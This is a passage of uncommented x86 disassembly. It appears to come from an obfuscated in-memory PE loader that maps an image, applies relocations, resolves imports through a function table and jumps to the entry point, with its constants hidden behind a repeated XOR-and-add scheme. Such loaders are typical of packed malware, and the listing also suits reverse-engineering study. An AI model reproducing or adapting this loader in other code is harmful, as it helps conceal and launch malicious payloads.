  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
